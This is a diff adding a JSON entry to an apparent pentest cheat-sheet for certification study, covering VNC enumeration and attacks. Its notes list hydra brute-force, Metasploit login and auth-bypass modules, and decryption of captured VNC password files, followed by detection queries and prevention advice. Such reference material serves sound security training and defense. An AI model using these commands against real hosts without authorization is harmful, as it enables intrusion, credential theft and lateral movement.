@@ -1,0 +1,83 @@
+{
+  "id": "recon-vnc",
+  "name": "VNC Enumeration & Authentication Attacks",
+  "command": "nmap -p5900 --script vnc-info,vnc-title,realvnc-auth-bypass <target>",
+  "description": "VNC remote desktop services (5900-5906, 5800 for web) are often exposed with no auth, weak passwords, or known auth-bypass CVEs. Enumerate version and auth type, test for no-auth access, brute the 8-char password, or exploit RealVNC auth bypass (CVE-2006-2369). A foothold or lateral-movement vector giving full GUI control.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Information Gathering",
+  "subcategory": "Service Enumeration",
+  "certifications": [
+    "OSCP",
+    "CPTS"
+  ],
+  "primary_cert": "OSCP",
+  "source": "PEN-200 service enumeration; nmap NSE",
+  "tags": [
+    "vnc",
+    "rfb",
+    "5900",
+    "remote-desktop",
+    "brute-force",
+    "auth-bypass"
+  ],
+  "mitre": [
+    "T1021.005",
+    "T1110.001"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== ENUMERATE ===\n  nmap -p5900-5906,5800 -sV <target>\n  nmap -p5900 --script vnc-info,vnc-title,realvnc-auth-bypass <target>\n  # vnc-info reports protocol version + security types (2=VNC auth, 1=None)\n\n=== CONNECT (test no-auth / known pass) ===\n  vncviewer <target>:5900\n  vncviewer <target>::5900 -passwd pass.file\n\n=== BRUTE FORCE (VNC password max 8 chars) ===\n  hydra -P /usr/share/wordlists/rockyou.txt -t 4 <target> vnc\n  # Metasploit:\n  msf> use auxiliary/scanner/vnc/vnc_login\n  msf> use auxiliary/scanner/vnc/vnc_none_auth\n\n=== CRACK A CAPTURED VNC PASSWORD FILE ===\n  # VNC stores passwords DES-encrypted with a fixed key:\n  vncpwd passwd            # or metasploit vnc decrypt\n  # ~/.vnc/passwd on Linux, registry on Windows (HKLM\\...\\WinVNC)\n\n=== REALVNC AUTH BYPASS (CVE-2006-2369) ===\n  msf> use auxiliary/admin/vnc/realvnc_41_bypass\n  # Server accepts \"None\" security type even when auth is required\n\n=== ALTERNATIVES / NEXT ===\n  # Once in: it is a full GUI session as the logged-on user\n  # Look for saved creds, RDP onward, screen content",
+  "examples": [
+    {
+      "label": "Enumerate VNC + check bypass",
+      "command": "nmap -p5900 --script vnc-info,realvnc-auth-bypass 10.10.10.10"
+    },
+    {
+      "label": "Brute force VNC password",
+      "command": "hydra -P /usr/share/wordlists/rockyou.txt -t 4 10.10.10.10 vnc"
+    },
+    {
+      "label": "Connect with viewer",
+      "command": "vncviewer 10.10.10.10:5900"
+    }
+  ],
+  "references": [
+    {
+      "title": "HackTricks - VNC pentesting",
+      "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-vnc"
+    },
+    {
+      "title": "MITRE T1021.005 - VNC",
+      "url": "https://attack.mitre.org/techniques/T1021/005/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "gs-nmap-service-scan",
+      "note": "Identify the VNC service/port first.",
+      "rel": "prereq"
+    },
+    {
+      "id": "recon-x11",
+      "note": "X11 is the other classic exposed-display vector.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "VNC (RFB) often ships with no/weak auth, an 8-char password limit, and reusable DES-encrypted password stores. Exposed services and legacy versions allow bypass or brute force to a full interactive desktop.",
+    "prerequisites": "Network access to the VNC port; exposed/weakly-authed service.",
+    "impact": "Full GUI control of the host as the logged-on user; credential theft; lateral movement.",
+    "detection": "[MITRE T1021.005/T1110.001] Many RFB handshake attempts (repeated 5900 connections) from one source; successful VNC auth from unusual IPs; nmap VNC NSE signatures.",
+    "artifacts": "Firewall/IDS logs of repeated 5900 connections; VNC server auth logs; new RFB sessions.",
+    "splunk_spl": "index=network dest_port>=5900 dest_port<=5906\n| stats count by src_ip, dest_ip\n| where count > 20",
+    "elastic_kql": "destination.port:(5900 or 5901 or 5902) and network.transport:tcp",
+    "sentinel_kql": "DeviceNetworkEvents\n| where RemotePort between (5900 .. 5906)\n| summarize Attempts=count() by RemoteIP, DeviceName, bin(Timestamp, 10m)\n| where Attempts > 20",
+    "sigma_rules": "net_vnc_bruteforce_or_exposure",
+    "prevention": "Never expose VNC to untrusted networks (tunnel over SSH/VPN); require strong auth; patch RealVNC; use unique long passwords; restrict by source IP; prefer modern RDP with NLA.",
+    "sources": [
+      "HackTricks",
+      "https://attack.mitre.org/techniques/T1021/005/"
+    ]
+  }
+}
